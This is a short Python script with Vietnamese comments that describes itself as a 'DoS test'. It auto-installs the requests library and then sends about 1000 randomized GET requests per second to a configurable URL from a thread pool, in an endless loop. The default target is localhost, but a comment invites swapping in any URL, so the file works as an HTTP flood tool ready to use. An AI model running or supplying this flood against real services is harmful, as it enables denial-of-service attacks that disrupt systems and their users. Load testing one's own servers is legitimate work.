import subprocess
import sys

def install_package(package):
    try:
        __import__(package)
    except ImportError:
        print(f"Đang cài đặt gói {package}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
        print(f"Đã cài đặt thành công gói {package}")

install_package('requests')
import threading
import requests
import random
import string
import time
from concurrent.futures import ThreadPoolExecutor

TARGET_URL = "http://127.0.0.1:5500/Webbanhang/"  # Thay bằng URL bạn muốn kiểm thử
REQUESTS_PER_SECOND = 1000
THREAD_COUNT = 20  # Số lượng thread trong pool

def generate_random_query():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=10))

def send_request():
    try:
        query = generate_random_query()
        url = f"{TARGET_URL}?q={query}"
        response = requests.get(url)
        print(f"Sent request: {url} - Status: {response.status_code}")
    except Exception as e:
        print(f"Error: {e}")

def main():
    print(f"Starting DoS test on {TARGET_URL} with target {REQUESTS_PER_SECOND} requests per second...")
    
    with ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
        while True:
            start_time = time.time()
            
            # Gửi 1000 request
            futures = [executor.submit(send_request) for _ in range(REQUESTS_PER_SECOND)]
            
            # Đợi tất cả request hoàn thành
            for future in futures:
                future.result()
            
            # Tính thời gian đã trôi qua
            elapsed_time = time.time() - start_time
            
            # Nếu chưa đủ 1 giây, đợi thêm
            if elapsed_time < 1:
                time.sleep(1 - elapsed_time)
            
            print(f"Completed {REQUESTS_PER_SECOND} requests in {elapsed_time:.2f} seconds")

if __name__ == "__main__":
    main()
